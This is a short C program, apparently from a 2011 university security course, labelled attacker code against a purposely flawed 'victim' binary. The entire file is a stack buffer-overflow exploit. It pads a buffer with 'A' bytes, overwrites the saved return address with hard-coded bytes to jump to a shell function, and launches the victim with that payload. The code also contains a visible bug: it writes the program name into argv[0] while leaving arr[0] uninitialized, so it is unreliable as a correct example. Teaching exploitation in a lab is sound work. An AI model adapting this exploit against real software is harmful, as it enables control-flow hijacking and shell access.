/**
 * Attacker code for project: this will exploit our badly-written victim.
 *
 * Kevin Butler (code courtesy of Trent Jaeger)
 *
 * Fri Feb 11 17:03:41 PST 2011
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  char* buf = (char *) malloc(sizeof(char)*1024);
  char** arr = (char **) malloc(sizeof(char *)*3);
  int i;
  int rtn_addr_distance  = 0x18;
  char rtn1 = 0x02,
    rtn2 = 0x87,
    rtn3 = 0x4,
    rtn4 = 0x8;

  /* fill up to return address */
  for (i = 0; i < rtn_addr_distance; i++)
      buf[i] = 'A';

  /* set address of replacement return address */
  buf[rtn_addr_distance] = rtn1;
  buf[rtn_addr_distance+1] = rtn2;
  buf[rtn_addr_distance+2] = rtn3;
  buf[rtn_addr_distance+3] = rtn4;

  /* set values of args to shell(0, argv) after return address */
  buf[rtn_addr_distance+4] = 0;
  buf[rtn_addr_distance+5] = 'A';
  buf[rtn_addr_distance+6] = 'A';
  buf[rtn_addr_distance+7] = 'A';
  buf[rtn_addr_distance+8] = 'A';

  /* set arguments for executing victim with buf */
  arr[0] = malloc(7);
  strncpy(argv[0], "victim", 7);
  arr[1] = buf;
  arr[2] = (char *)0;

  /* execute victim */
  execv("./victim", arr);

  exit(0);
}


